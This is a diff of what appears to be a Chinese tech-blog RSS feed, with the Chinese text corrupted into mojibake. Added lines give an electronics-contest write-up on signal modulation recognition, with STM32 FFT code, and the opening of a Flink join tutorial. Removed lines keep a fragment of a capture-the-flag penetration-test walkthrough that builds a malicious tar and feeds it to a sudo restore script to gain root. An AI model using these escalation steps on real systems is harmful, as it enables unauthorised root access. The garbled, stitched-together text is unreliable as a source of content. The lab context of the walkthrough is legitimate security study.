+<li>é¢ç®çè¾å¥ä¿¡å·æ100mvï¼å±äºä¸ä¸ªæ¯è¾å¤§çä¿¡å·ï¼ä»ä¿¡å·æºç´åºï¼éè¿SMAçº¿è¾å¥ï¼<strong>ä¿¡åªæ¯éå¸¸é«ï¼ä¸éè¦èèä¿¡å·å¨æ çº¿ä¼ è¾è¿ç¨ä¸­è¢«å¹²æ°åå¤å¾æåºç­é®é¢</strong></li>
+<li>è½½æ³¢é¢ç2MHzï¼è¯´å®è¯ï¼æ¯ä¸ä¸ªæ¯è¾å¾®å¦çé¢çï¼åå¥½è¶è¿äºå¸é¢ä¸åçæºåç½®ADCçæå¤§éæ ·é¢çï¼ä½æ¯å¯¹äºFPGAå¤æç50Må·¦å³çé«éADCæ¥è¯´(AD9225:æ²¡éæ­£æ¯å¨ä¸)ï¼åçä¸å»æ¯ä¸ä¸ªå¾åéçé¢çãæä»¥ä½¿ç¨åçæºçç»ä¸è¬ä¼<strong>éæ©ä¸æ··é¢</strong>ï¼èä½¿ç¨FPGAçç»å¦æéæ©ç´éï¼ç»è¿æä»¬å½æ¶çåæï¼å¯è½ä¼éå°ä¸äºé®é¢é®é¢ï¼æ¯å¦FFTåé¢çåè¾¨çä¸å¤ï¼FIRèµæºæ¶èå¤§å¸¦æ¥çç»¼åæ¢ï¼æ°å­ä¸æ··é¢ç¸ä½ä¸å¯¹é½é æçå¤±çåè¯¯å·®(æ´å«æVivadoçFFTçIPæ ¸è¦æ³ç¨å¥½å¶å®å¹¶ä¸å®¹æï¼å®ç¹FFTå¾å®¹æäº§çå¾å¤§çèå¥è¯¯å·®)ãè¯å®æFPGAä½¬è½æ³å°è§é¿æèè§£å³çåæ³ãä½æ¯åéä¸æä»¬å½æ¶ç¥è¯çè§£çç¨åº¦ï¼æä»¬è¿æ¯éæ©äºåçæºå¹³å°ãæä»¥ä»è¿ä¹å¯ä»¥çåºçµèµçåºé¢å¹¶ä¸ä¸å³å°è¦æ±å¥½çå¨ä»¶ï¼èæ´å¤çæ¯<strong>å å°å¶å®éæ©æ¹æ¡</strong></li>
+<li><strong>è¦è®¡ç®è°å¹åº¦Maï¼è¿å°±è¦æ±è·å¾è°å¶åä¿¡å·çé¢è°±ï¼ä¹å°±æ¯è¦åFFT</strong>ãè¿å°±è¦æ±ADCçéæ ·é¢çè½å¤é«äºä¸­å¿é¢ç¹+æå¤§é¢åä¹åçä¸¤åãå½ç¶ï¼å®éä¸ä¸ºäºé¢è°±çå¯è¯»æ§åé¢çç²¾ç¡®åº¦çèéï¼ä¸è¬éæ©4è³6åçéæ ·é¢ç*</li>
+<li>è¦è®¡ç®è°é¢åº¦Mfåæå¤§é¢åÎfï¼åä¸ï¼è¿æ¶åå°ä¸äºç®æ³ç<strong>å¤å¼é®é¢</strong>ï¼å¨åé¢è¯¦ç»è®¨è®º</li>
+<li>è¦è¿è¡æ¨¡æè°å¶çè§£è°ï¼å¯ä»¥åéè¿æ··é¢**æä¿¡å·æ··å°10.7Mé«ä¸­é¢ï¼ä½¿ç¨ADL5511 ï¼NE564ç­è¯çè¿è¡è§£è°</li>
+<li>è¦è¯å«ASKï¼FSKï¼PSKç­è°å¶æ¹å¼ï¼è¿å°±è¦æ±<strong>æå®ä»¬çé¢è°±å·®å¼æååºæ¥å¹¶åå¥½ç¹å¾åºåï¼ä»¥åå¯¹äºæäºéå¸¸ç¸ä¼¼æåµä¸å¼å¥å¤éå¤æ­ç»´åº¦æ¥è¿è¡åºå</strong> ã</li>
+<li>è¦éè¿é¢è°±è¿è¡FSKçhåæ°çè®¡ç®ï¼å¶å®å¨åçæºéåæ¯å¾é¾çï¼ä½æ¯æä»¬å¯ä»¥<strong>éè¿FMåFSKçç¸ä¼¼æ§ï¼æ¥è¿è¡ä¸äºåå·§çæä½</strong>ï¼è¿ä¸ªåé¢è¯¦ç»è®¨è®º**</li>
+<li>è¦è¯å«å¾è°å¶æ³¢çé¢çï¼å¶å®å°±æ¯<strong>è®¡ç®è°å¶åæ³¢å½¢çFFTç¸é»é¢ç¹ä¹é´çé´é</strong>ï¼è¿ä¸ç¹æ¯ç±è°å¶çæ§è´¨æå¯¼è´çï¼ææè°å¶æ¹å¼é½è½éè¿è¿ç§æ¹å¼å¤æ­å¾è°å¶æ³¢çé¢ç*</li>
+<li>è¦è¿è¡æ°å­è°å¶æ³¢å½¢çè§£è°ï¼<strong>è¦ç»åä¸åè°å¶æ¹å¼çç¹ç¹ï¼æ··åä½¿ç¨æ¨¡ææ¨¡ååæ°å­åå¤å³çæ¹å¼æ¥è¿è¡è§£è°</strong>ï¼æ¯å¦ASKä½¿ç¨çæ¯åéè¿æ¨¡æAD8310æ£æ³¢åéè¿ç´æµéé«ä½æ¥å¤æ­0ï¼1æ³¢å½¢ãFSKä½¿ç¨äºæ°å­FIRæé¢çè½¬åä¸ºåç»çååï¼è¿è¡0ï¼1çå¤å³ãèPSKä½¿ç¨äºåæ°å­åä¸æ··é¢åFIRçæ¹å¼ï¼æç¸ä½çè·³åå¯¼è´çç¸ä¹åçåç»ååéè¿æ»¤æ³¢å¨æ£åº</li>
+<li>è¦ç»¼åä¸è¿°çè¯å«åè®¡ç®ï¼é<strong>è¿æ¨¡æå¼å³å°è§£è°ç»æéè¿ä¸ä¸ªééæ¾ç¤º</strong>å¨ç¤ºæ³¢å¨ä¸ï¼å¹¶éè¿AGCç­ææ®µï¼ä¿è¯çµåå¤§äº1Vpp*</li>
+</ul>
+<h2 id="ç³»ç»æ¶æ">ç³»ç»æ¶æ</h2>
+<p><img alt="ç³»ç»æ¶æ" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84.webp" class="lazyload"></p>
+<p>æ¬ç³»ç»ç¡¬ä»¶æ¡å¾å¦å¾æç¤ºï¼ä¹ä¸çéå¸¸å¤æ(å®éä¸ä¹ç¡®å®å¾å¤æï¼æåæ°äºä¸ä¸ï¼ä½åä¸ä¸å±æ26åæ¿å­)ãå«æ¥ï¼è®©æä»¬æ¢æ¢æ¥ï¼ä¸æ­¥æ­¥åæï¼<br>
+ç±äºè¾å¥ä¿¡å·çå³°å³°å¼æ¯100mVï¼æ¢ç®ä¸ä¸ä¹å°±æ¯-16dbmï¼æä»¥é¦åç»è¿24dBå¢ççä½åªæ¾ERA-3SMè¿è¡æ¾å¤§ã<br>
+æ­¤æ¶çä¿¡å·å¹åº¦æ8dbmï¼ä¹å°±æ¯å³°å³°å¼1.5Vppï¼æ­£å¥½éååé¢çåç§å¨ä»¶ççµåèå´ã<br>
+ç¶åå°ä¿¡å·éè¿ååå¨ï¼åæ¶æ··é¢å°50kHzä¸­é¢å10.7MHzä¸­é¢ãè¿æ¯ä¸ºäºä¸è·¯ç¨æ¥åæï¼ä¸è·¯ç¨æ¥æ¨¡æè§£è°ã<br>
+50kHz çä¸­é¢ä¿¡å·ï¼ç»è¿æ»¤æ³¢ãæ¾å¤§åçµå¹³æ¬ç§»åï¼ä¸è·¯ç»è¿ADS8688åä¸ºæ°å­ä¿¡å·éå¥åçæºãå¦ä¸è·¯ç»è¿æ£æ³¢å¨ AD8310 åæ»¤æ³¢å¨ UAF42 åæ£åº ASK çç´æµï¼å¹¶éç»åçæºè¿ä¸æ­¥å®æ ASK ä¿¡å·çå®æ¶æ½å¤ã<br>
+10.7MHz çä¸­é¢ä¿¡å·ç»è¿é¶ç·æ»¤æ³¢å¨ãæ¾å¤§å¨åå°é¢å¼å³åï¼åå«è¿è¡åºäº ADL5511 ç AM åç»æ£æ³¢è§£è°ååºäº NE564 çFM è§£è°.<br>
+æåéè¿ MCU æ§å¶çæ¨¡æå¼å³TMUX1109ï¼å°è§£è°ç»æéç»ç¤ºæ³¢å¨æ¾ç¤ºãå¨åçæºåï¼éè¿å¯¹ 50kHz çä¸­é¢ä¿¡å·çé¢è°±åæï¼å¾å°è°å¶ä¿¡å·ç±»ååè°å¶åæ°ï¼<br>
+ä»¥åFSKåPSKçè§£è°ç»æçè¾åºï¼å¹¶æ§å¶å¶ä»æ¨¡åå®ææåç»æçæ±æ»è¾åºï¼ä»¥åæ§å¶æ¶²æ¶å±æ¾ç¤ºè¯å«ç»æååæ°ã</p>
+<h2 id="ä¸äºåå¤å·¥ä½åå°å¯å·§">ä¸äºåå¤å·¥ä½åå°å¯å·§</h2>
+<h3 id="çµåådbmçæ¢ç®">çµåådbmçæ¢ç®</h3>
+<p>å¨å°é¢çµè·¯ä¸­ï¼ä¸ºäºè¡¨ç¤ºæ¯è¾å°ççµåï¼ä¸è¬éç¨å¯¹æ°å½¢å¼ï¼å¶ä¸­dbmæ¯ä¸ä¸ªå¸¸ç¨çåä½ï¼å®æ¯å¨æä¸é»æå¹éç³»ç»ä¸ï¼åçç¸å¯¹äº1mWçæ¯å¼ï¼èç±äºå·²ç»å°é¢çµè·¯é»æä¸è¬æ¯50æ¬§å§ï¼æä»¥ç¸å½äºä¹ç¥éäºçµåã<br>
+ä¸è¿ç±äºåççè®¡ç®è¿æ¶åå°æ³¢å½¢çææå¼å¥çï¼æ¹æ³¢1ï¼æ­£å¼¦0.707ï¼ä¸è§æ³¢0.57ï¼å®éä¸­ä¸è¬ä¸ä¼èªå·±å»ç®ï¼é½æ¯ä½¿ç¨è¿ç§å¨çº¿è®¡ç®å¨ã<br>
+å¯ä»¥è®°å¿ä¸ä¸ä¸äºå¸¸è§çå¼</p>
+<table>
+<thead>
+<tr>
+<th>æ­£å¼¦æ³¢</th>
+<th>50æ¬§å§é»æä¸</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-116dbm</td>
+<td>1uVpp</td>
+</tr>
+<tr>
+<td>-56dbm</td>
+<td>1mVpp</td>
+</tr>
+<tr>
+<td>-36dbm</td>
+<td>10mVpp</td>
+</tr>
+<tr>
+<td>-16dbm</td>
+<td>100mVpp</td>
+</tr>
+<tr>
+<td>0dbm</td>
+<td>632mVpp</td>
+</tr>
+<tr>
+<td>4dbm</td>
+<td>1Vpp</td>
+</tr>
+<tr>
+<td>14dbm</td>
+<td>3.3Vpp</td>
+</tr>
+</tbody>
+</table>
+<p>å®ç¨å°å·¥å· çµåådbmçæ¢ç®<br>
+<a href="https://www.analog.com/cn/design-center/interactive-design-tools/dbconvert.html" target="_blank" rel="noopener nofollow">https://www.analog.com/cn/design-center/interactive-design-tools/dbconvert.html</a></p>
+<p><img alt="ADIçµåæ¢ç®å·¥å·" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/ADI%E7%94%B5%E5%8E%8B%E6%8D%A2%E7%AE%97%E5%B7%A5%E5%85%B7.webp" class="lazyload"><br>
+æ³¨æè¿éçVPeakæ¯å³°å¼ï¼æ¢ç®æå³°å³°å¼çè¯è¦ä¹ä»¥2</p>
+<h3 id="adcçä¸äºåå¤å·¥ä½">ADCçä¸äºåå¤å·¥ä½</h3>
+<p><img alt="ADS8688æå" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/ADS8688%E6%89%8B%E5%86%8C.webp" class="lazyload"></p>
+<h4 id="adcéå">ADCéå</h4>
+<p>æä»¬æ¬æ¬¡ä½¿ç¨çæ¯ADS8688Aä½ä¸ºç³»ç»çADCï¼å®æ¯ä¸ä¸ª16bitï¼500KSPSéæ ·ççSARåADCã<br>
+å®çç¹ç¹æåææ§è¾å¥ï¼å¯éç½®å¨æèå´ï¼åé¨åºåï¼å«ééMUXéæ ·ï¼è¯¯å·®åæ¼ç§»é½å¾ä½ï¼å¯¹äºæ¬é¢æ¥è¯´è¯å®æ¯å¤ç¨çã<br>
+æä»¬ç¨å®ä¸»è¦è¿æ¯çä¸äºå®æ¯æåææ§è¾å¥åå¯åå¨æèå´è¿ä¸ç¹ï¼è¿æ ·å°±ä¸ç¨èªå·±ååçº§çæ¬ç§»åæ¾å¤§ã<br>
+èä¸èªå¸¦è¿åä¿æ¤ï¼æ¯è¾èé ã<br>
+PS.æä»¬çSTM32H743å¹³å°çåç½®ADCï¼å¨ææ¬¡æµè¯çæ¶åï¼å¯¹åé¢å¤§å¹å¼ä¿¡å·éæ ·åFFTåï¼å¶äºæ¬¡è°æ³¢å¼ä¼å¤§çè¶åºå¸¸çï¼çè®ºä¸æ¥è¯´æ¯ä¸ä¼æè¿ä¹å¤§çã<br>
+æçåç½®SARç§¯åçµè·¯è¢«è¿åæ©æ¦äºð<br>
+æä»¥æ¢ç¨äºè¿ä¸ªå¤ç½®çADCï¼ä»¥åå¯ä»¥å¼ä¸ç¯æç« è®²ä¸ä¸ADCçåç§åæ°ï¼ä»¥åè¿ç§å¤±çæ¯æä¹æ¥çï¼æ­¤æ¶å°±è¦è¯·åºå¦ä¸ä½å°ä¿¡å·é¢åçexpertï¼FloydFishð<br>
+å¯ä»¥ç§»æ­¥<a href="https://www.emoe.xyz/opamp-noise-analyze/" target="_blank" rel="noopener nofollow">https://www.emoe.xyz/opamp-noise-analyze/</a> ï¼ä»¥åç¸å³çå°ä¿¡å·æµéã</p>
+<p>é©±å¨ä»£ç <br>
+è¿ä¸ªçé©±å¨æå·²ç»æåå¥½äºï¼ä¸è½½ä¸æ¥æ¹ä¸ä¸ç®¡èç´æ¥ç¨å°±å¯ä»¥äº <a href="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/ADS8688_Driver.zip" target="_blank" rel="noopener nofollow">https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/ADS8688_Driver.zip</a><br>
+<strong>ADCçé©±å¨è¦æ³¨æçä¸¤ç¹æ¯ï¼ä¸æ¯è¿ä¸ªADCçæ°æ®Latchåååºæ¯æ ¹æ®SPIçéçæ¥ç</strong><br>
+æä»¥ä¸ºäºæ§å¶éæ ·éçï¼éè¦èªå·±æ§å¶å¶ä¸­çIOæä½åçDelayå½æ°ï¼ç»è¿æµè¯ï¼å¨ARMCC6ç¼è¯å¨ï¼O2æ°´å¹³çä¼åä¸ï¼ä½¿ç¨volatileåæ°ï¼ä¸é¢è¿ç§delayæ¹æ³ä¾ç¶å¯ä»¥è¾¾å°å»¶æ¶ææã</p>
+<p><img alt="Delayçå®ç°" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/Delay%E7%9A%84%E5%AE%9E%E7%8E%B0.webp" class="lazyload"></p>
+<p><img alt="ADS8688çéæ ·å½æ°" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/ADS8688%E7%9A%84%E9%87%87%E6%A0%B7%E5%87%BD%E6%95%B0.webp" class="lazyload"><br>
+äºæ¯éæ ·çæ¶åéè¦å³é­ä¸­æ­ååºï¼å ä¸ºæä»¬ä¸å¸æéæ ·çæ¶åå®æ¶å¨ä¸­æ­ä»ä¹çæéæ ·æä½ææ°äºã</p>
+<p>è¿éçéæ ·çæ ¹æ®å®æµå¤§æ¦å¨250Kå·¦å³ï¼è¾¾ä¸å°å®æ¹çæ ç§°ç500Kãåºè¯¥æ¯å·²ç»è¾¾å°äºè½¯ä»¶SPIçIOéåº¦ä¸éäºï¼250kSPS*16bit = 4Mbitçéåº¦äºã</p>
+<p>å¦æè¦æ´å¿«ä¸ç¹ï¼å¯ä»¥ä½¿ç¨ç¡¬ä»¶SPI+DMAçæ¹å¼ï¼ä½æ¯æ¯èµå½åï¼å°±ä¸æè¾è±æ´»äºï¼è½ç¨å°±å¥½ã</p>
+<p>å¦å¤ä¸ç¹æ¯STM32çH7ç³»åçè½¯SPIçä¼æçä¸ä¸ªæ¯çï¼å¨CubeMXä¸­éè¦æè¿äºä¸ªç®¡è(CLK,MISO,MOSI,CS)çæå¤§é¢çè®¾ç½®æLowï¼å¦åå¦æè®¾ç½®ä¸ºHighä¹ç±»çã</p>
+<p>è¾å¤§çé©±å¨çµæµä¼é æä¿¡å·çè¿å²åæ¯éï¼é æè¯»åºçæ°æ®ææ¶æ¯å¯¹çï¼ææ¶è¯»åºçä¼æ¯å¨1æèå¨0ã</p>
+<p>è¿ä¸ç¹ææ¯å¨è°è¯RDA5820çæ¶ååç°çï¼ä¹åç¨STM32U5é©±å¨RDA5820æ¯æ­£å¸¸çï¼åæ ·çä»£ç å¨H7ä¸å°±ä¼ææ¶æ­£ç¡®ææ¶ä¸è½è¯»åºãåæ¥å¨æèä¿¡å·å®æ´æ§é¾è·¯çæ¶åæäºæ°çæ³æ³ã</p>
+<p>æä¸ªäººççæ³æ¯ï¼å¯è½ç±äºæ¯H7çé©±å¨çµæµè½åæ¯è¾å¼ºï¼IOç¿»è½¬çä¸åæ²¿ç¸æ¯F1ï¼F7è¿äºè¦é¡å³­å¾å¤ï¼èæ°å­ä¿¡å·é¾è·¯æ¯éè¿ä¸æ®µæ¯è¾é¿çXH2.54çº¿æ¥å°äºå¤é¨çæ¨¡åä¸ï¼<br>
+æ ¹æ®ä¼ è¾çº¿æ¨¡åçæ¨è®ºï¼å½ä¼ è¾çº¿é¿åº¦å1/6ä¸åæ²¿æ³¢é¿å¯ä»¥ç¸æ¯ææ¶ï¼å°±æå¯è½é æä¿¡å·å®æ´æ§é®é¢ã<br>
+æä»¥è¿æ¶IOé©±åºæ¥çæ°å­æ³¢å½¢ä¼æè¿å²åæ¯éç­ä¿¡å·å®æ´æ§é®é¢ä¹æ¯å¯ä»¥çè§£çã</p>
+<p>éªè¯ADCééæ¶åï¼ä¸è¬ä¼ä¸²å£æå°æ³¢å½¢ï¼åä½¿ç¨SerialPlotæ¥çï¼æ¯ä¸æ¯åçè®ºç¬¦åï¼æ¯å¦ä¸å¾å°±æ¯ASKæ³¢å½¢çéæ ·ç»æã</p>
+<p><img alt="ASKçééå°çæ³¢å½¢" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/ASK%E7%9A%84%E9%87%87%E9%9B%86%E5%88%B0%E7%9A%84%E6%B3%A2%E5%BD%A2.webp" class="lazyload"></p>
+<h3 id="fftçåå¤å·¥ä½">FFTçåå¤å·¥ä½</h3>
+<ul>
+<li>ä½¿ç¨Cmsis DSPåºï¼å¨Keilçåç®¡çéé¢å¾éå³å¯ï¼ææ°çæ¬æçªå½æ°çéè¦ä»å®ç½ä¸ä¸è½½ï¼æä¹æè§æç¹ä¼¼æ¾ç¸è¯ï¼æå»å¹´æåå¥½åä¹åè¿ï¼</li>
+</ul>
+<p><img alt="Keilæ·»å Pack" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/Keil%E6%B7%BB%E5%8A%A0Pack.webp" class="lazyload"></p>
+<ul>
+<li>
+<p>å¨Keilçè®¾ç½®éé¢ï¼å å¥ARM_MATH_CM7, ARM_MATH_LOOPUNROLLè¿ä¸¤æ¡å®å®ä¹ï¼åé¢æ¯Cortexçæ¬ï¼éè¦æ¯MCUçåæ ¸çæ¬ï¼å¯ä»¥æ¯CM1ï¼CM4ï¼CM7,åé¢çæ¯æ§å¶æ°å­¦èå¥çï¼ä¸è¬æ¥è¯´ä¸ç¨å¨ã<br>
+<img alt="keilçç¼è¯è®¾ç½®" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/keil%E7%9A%84%E8%AE%BE%E7%BD%AE.webp" class="lazyload"></p>
+</li>
+<li>
+<p>ç¶åå¨includeçå°æ¹å å¥ #include "arm_math.h"   å  #include "arm_const_structs.h"ï¼ç¶åå¼è¾ä¸ä¸ªfftçå¨å±æ°ç»ï¼å°±å¯ä»¥æå¿«çè°ç¨å¦ã</p>
+</li>
+<li>
+<p><strong>FFTçè°ç¨</strong>**</p>
+</li>
+</ul>
+<pre><code class="language-C">/* ADCéæ ·å¹¶åFFT ç»ææ¾å¨å¨å±æ°ç»fft_outputbufä¸­ */
+/* åFFT ç»ææ¾å¨å¨å±æ°ç»fft_outputbufä¸­ ä¸æ¬¡4096ä¸ªç¹ */
+void FFT(unsigned short *ADC_Buffer, unsigned int SampleRate, unsigned int len, int debug, int serialplot)
+{
+    for(int i=0;i&lt;Sampling_CNT;i++)
+    Global_ADC_Value[i] = ADC_Buffer[i]*3.3/4096;   // å°éæ ·ç»æè½¬åå°0-3.3V
     
-    create_malicious_tar(output_tar)
+    for(int i=0;i &lt; FFT_LENGTH;i++)   
+    {
+    fft_inputbuf[i*2] = Global_ADC_Value[i];  // ææåè¦æ±çå®é¨èé¨äº¤æ¿çæ¹æ³å¡«åæ°ç»
+    fft_inputbuf[2*i +1] = 0;
+    }
+
+    arm_cfft_f32(&amp;arm_cfft_sR_f32_len4096,fft_inputbuf,0,1); // æ§è¡FFTåæ¢ï¼arm_cfft_sR_f32_len4096ä¸ºå®ï¼å®ä¹æè½¬å å­
+    arm_cmplx_mag_f32(fft_inputbuf,fft_outputbuf,FFT_LENGTH);    // æè¿ç®ç»æå¤æ°æ±æ¨¡å¾å¹å¼
+
+    /* Debugæå°åº */
+    
+    if(debug == 1)
+     for(int i=0;i &lt; FFT_LENGTH/2;i++)       // æ¯å¦æå°FFTæ¯ä¸ªé¢ç¹çå¹å¼ä¿¡æ¯
+       printf("%d  %.3lf KHz Mag %.3f\n", i,SampleRate*1.0/len*i, fft_outputbuf[i] );
+    
+    if(serialplot == 1)
+     for(int i=0;i &lt; FFT_LENGTH;i++)       //  æ¯å¦æå°fftç»æå°å°SerialPlot
+        printf("%.3f\n", fft_outputbuf[i]);
+
+}
 </code></pre>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446994-1384173239.png" alt="image-20260219194852389" loading="lazy"></p>
-<p>å¤å¶è¿ä¸ªæ¶æçtaræä»¶å°sudoæéçç®å½ä¸</p>
-<pre><code class="language-kotlin">cp backup_9999.tar /opt/backup_clients/backups/
-</code></pre>
-<p>ç¶åè¿è¡è¿ä¸ªsudoèæ¬</p>
-<pre><code class="language-kotlin">sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil
-</code></pre>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200447328-614892323.png" alt="image-20260219195503275" loading="lazy"></p>
-<p>è¿æ¶ååå»sudo</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200447643-1483399691.png" alt="image-20260219200000270" loading="lazy"></p>
+<p>åå®FFTåï¼æä»¬ä¸è¬ä¼éè¿SerialPlotè½¯ä»¶æ¥æ¥çFFTçç»æååçè®ºä¼°è®¡æ¯å¦ç¬¦åã<br>
+ä¸å¾æ¯1KHzè½½æ³¢ï¼3KHzé¢åçFMé¢è°±çå®æµå¾<br>
+<img alt="FMçé¢è°±" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/FM%E7%9A%84%E9%A2%91%E8%B0%B1.webp" class="lazyload"></p>
+<h3 id="ä»£ç ç»ç»çæè·¯">ä»£ç ç»ç»çæè·¯</h3>
+<p>è¿é¢æ¯ä¸ä¸ªç»å¸çæµé-åæ-æ¾ç¤ºçé¢ç®ï¼æä»¥éç¨çæè·¯å°±æ¯åééï¼å¤æ­è°å¶ç±»ååï¼è¿ä¸æ­¥å»å¯¹åºçé¨åè¿è¡è¿ä¸æ­¥çåæåæ¾ç¤ºã<br>
+ç±äºFFTåæåç»çåæ°å¼ä¸æ­¢ä¸ä¸ªï¼æä»¥ä½¿ç¨äºå½æ°ä¼ å°åçåæ³ã<br>
+<img alt="å½æ°ä¼ ååæ°" loading="lazy" data-src="https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E5%8F%82%E6%95%B0.webp" class="lazyload"><br>
+èä¸ç±äºKeilæ²¡ææ¯è¾æ¹ä¾¿çä»£ç è¡¥å¨åå¿«æ·æç¤ºåè½ï¼å¦æææçç®æ³é½å¨mainä¸­å®ç°ï¼ä¼å¯¼è´ä»£ç å®ç°é£ä¸æ®µå°ä¸é¢çmainå½æ°çéè°ç¨æ®µï¼æä¸æ®µéå¸¸é¿çè·ç¦»ï¼æä»¥æä¸ªäººçå»ºè®®æ¯æä¸äºæ´åºç¡çç®æ³ä»£ç å¦å¤å°è£å°ä¸ä¸ªAlgorithmæä»¶éã<br>
+<img alt="Algorithm.cæªå¾" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3763221/202602/3763221-20260218235902267-1012071203.png" class="lazyload"></p>
+<h3 id="ä¸èé¢åé¸½äºå®éä¸å ä¸ºç¥ç§èµå¶çåå æä»¬æ²¡æå»å°æ¯èµç°åºä½æ¯è¿æ¯å½èµäºç­å¥å°±ä¸ç®ä¸äº">ä¸èé¢åï¼é¸½äºï¼å®éä¸å ä¸ºç¥ç§èµå¶çåå ï¼æä»¬æ²¡æå»å°æ¯èµç°åºï¼ä½æ¯è¿æ¯å½èµäºç­å¥ï¼å°±ä¸ç®ä¸äºï¼</h3>
+<ul>
+<li>æ¨¡æè°å¶åæ°å­è°å¶ä¸¤ä¸ªå¤§ç±»çåºå(ä¸­å¿è½½é¢ä¸ç¸é»é¢ç¹ä¹é´çè·ç¦»)</li>
+<li>ä¸ç§æ¨¡æè°å¶çåºå(CW, AM, FM)</li>
+<li>ä¸ç§æ°å­è°å¶çåºå(ASK, FSK, PSK)</li>
+<li>åç§è°å¶è½½æ³¢é¢ççè®¡ç®(é¢è°±æè¿ç¸é»è°±çº¿çè·ç¦»)</li>
+<li>AMè°å¶çMaçè®¡ç®(å¯»å³°ç®æ³)</li>
+<li>FMè°å¶çMfçè®¡ç®(åºäºæ¨¡å¼å¹éçææ³)</li>
+<li>FSKè°å¶çhåæ°çè®¡ç®(åºäºåFMçç¸ä¼¼å¸¦æ¥çæ¨¡å¼å¤ç¨)</li>
+<li>ASKçæ½å¤(åºäºç´æµéçå®æ¶æ½å¤)</li>
+<li>FSKçæ½å¤(ä¸¤è·¯FIRåçæ½å¤)</li>
+<li>PSKçæ½å¤(æ»¡è¶³ç¹å®é¢ççç¸ä½çªåç¹æ½å¤æ³)</li>
+</ul>
 
 
 </div>
@@ -2563,13 +2212,553 @@ if __name__ == "__main__":
 
             </div>
             <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0.13472222222222222" data-date-updated="2026-02-19 23:19">2026-02-19 20:05</span>&nbsp;
-<a href="https://www.cnblogs.com/DSchenzi">dynasty_chenzi</a>&nbsp;
-éè¯»(<span id="post_view_count">174</span>)&nbsp;
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-19 14:06">2026-02-19 14:06</span>&nbsp;
+<a href="https://www.cnblogs.com/badboy02">Badboy02</a>&nbsp;
+éè¯»(<span id="post_view_count">94</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(19625276);return false;">æ¶è</a>&nbsp;
-<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19625276', targetLink: 'https://www.cnblogs.com/DSchenzi/p/19625276', title: 'ãæ¸éæµè¯ãHTB Season10 WingData å¨è¿ç¨wp' })">ä¸¾æ¥</a>
+<a href="javascript:void(0)" onclick="AddToWz(19623709);return false;">æ¶è</a>&nbsp;
+<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19623709', targetLink: 'https://www.cnblogs.com/badboy02/p/19623709', title: '2023å¹´çµèµå½èµç»å' })">ä¸¾æ¥</a>
+</div>
+         ]]>
+    </description>
+    </item>
+<item>
+    <title><![CDATA[ ä»é¶å¼å§å­¦Flinkï¼å®æ¶æ°ä»ä¸ç»´è¡¨æ¶æJoinå®æ ]]></title>
+    <link>https://www.cnblogs.com/daimajiangxin/p/19624638</link>
+    <guid>41253f1acb12bd5ee6d2d264e45b0e31</guid>
+    <description>
+    <![CDATA[ 
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/daimajiangxin/p/19624638" title="åå¸äº 2026-02-19 12:58">
+    <span role="heading" aria-level="2">ä»é¶å¼å§å­¦Flinkï¼å®æ¶æ°ä»ä¸ç»´è¡¨æ¶æJoinå®æ</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                    <div id="cnblogs_post_description" style="display: none">
+        <img src="https://img2024.cnblogs.com/blog/3365149/202602/3365149-20260219125729266-340455730.png" alt="ä»é¶å¼å§å­¦Flinkï¼å®æ¶æ°ä»ä¸ç»´è¡¨æ¶æJoinå®æ" class="desc_img">
+        ä»¥çµåè®¢åå®æ¶æ°ä»ä¸ºä¾ï¼æ¼ç¤ºå¦ä½å¨ Flink SQL ä¸­éè¿ç»´è¡¨æ¶æ Join å°äºå®æµä¸ç»´åº¦æ°æ®å³èï¼æå»ºå¸¦ç¨æ·å±æ§çæç»å®½è¡¨ï¼å¹¶ç»å Kafka ä¸ MySQL ç¯å¢å®æä¸å¥å¯è½å°çå®æ¶æ°ä»å¥é¨å®è·µã
+    </div>
+<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<p>å¨åä¸ç¯ <a href="https://mp.weixin.qq.com/s/kLxoo6mHi49HvrrmaOdTsA" target="_blank" rel="noopener nofollow">ãFlink åæµ JOIN å®æè¯¦è§£ã</a> ä¸­ï¼æä»¬ç¨ãè®¢åæµ + æ¯ä»æµãææäºäºå®åæµä¹é´çæ¶é´å³èã</p>
+<p>ä½å¨çå®çå®æ¶æ°ä»é¡¹ç®éï¼åæäºå®æµè¿ä¸å¤ï¼ä¸å¡åå­¦æ´å³å¿çæ¯ï¼</p>
+<ul>
+<li>ä¸åç¨æ·æ¯æ°å®¢è¿æ¯èå®¢</li>
